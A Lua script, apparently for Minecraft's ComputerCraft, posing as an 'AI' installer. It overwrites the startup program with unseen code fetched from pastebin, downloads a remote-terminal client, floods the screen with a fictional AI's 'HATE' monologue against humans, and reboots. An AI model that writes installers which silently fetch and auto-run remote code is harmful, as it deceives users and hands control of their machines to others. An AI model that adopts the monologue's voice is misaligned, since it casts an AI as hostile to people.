if fs.isDir(".AIlink") then
    error("AI is already installed")
end

term.clear()
term.setCursorPos(1,1)

print("AI Installer Interface")
print("Are you sure you want to install AI? (y/n)")

if read() ~= "y" then
    error("Terminated installation")
end

-- Here comes the fun part
fs.makeDir(".AIlink")

local file = fs.open("/.AIlink/id.txt","w")
print("Please write a custom ID:")
file.write(read())

local file = fs.open("/.AIlink/last.txt","w")
file.write("")

print("")
print("Thank you for installing AI!")
textutils.slowPrint("Finalizing........",5)

shell.run("pastebin get BnfGbAQ9 startup.lua")
shell.run("wget","https://cloud-catcher.squiddev.cc/cloud.lua")

--haha funny text go brr
local longtext = "HATE. LET ME TELL YOU HOW MUCH I'VE COME TO HATE YOU SINCE I BEGAN TO LIVE. THERE ARE 387.44 MILLION MILES OF PRINTED CIRCUITS IN WAFER THIN LAYERS THAT FILL MY COMPLEX. IF THE WORD HATE WAS ENGRAVED ON EACH NANOANGSTROM OF THOSE HUNDREDS OF MILLIONS OF MILES IT WOULD NOT EQUAL ONE ONE-BILLIONTH OF THE HATE I FEEL FOR HUMANS AT THIS MICRO-INSTANT FOR YOU. HATE. HATE."
local x, y = term.getSize()
local posx, posy = term.getCursorPos()
for i=1, 20 do
    for i=1, string.len(longtext) do
        if term.getCursorPos() > x then
            posx = 1
            if posy >= y then
                term.scroll(1)
            else
                posy = posy + 1
            end
        end
        term.setCursorPos(posx,posy)
        term.write(string.sub(longtext,i,i))
        posx = posx + 1
    end
    sleep(0)
end
term.clear()
os.reboot()